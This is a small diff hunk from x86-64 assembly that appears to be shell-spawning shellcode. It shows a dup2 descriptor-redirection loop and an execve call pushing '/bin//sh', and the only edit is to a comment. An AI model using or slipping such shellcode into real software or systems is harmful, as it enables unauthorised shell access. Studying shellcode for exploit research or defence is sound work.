@@ -92,7 +92,7 @@ dup2_syscall:
     jns     dup2_syscall
 
 
-    ; execve("/bin/zsh", NULL, NULL)
+    ; execve("/bin/sh", NULL, NULL)
     mov     rbx, '/bin//sh'
     push    rbx       
     mov     rdi, rsp        ; fname
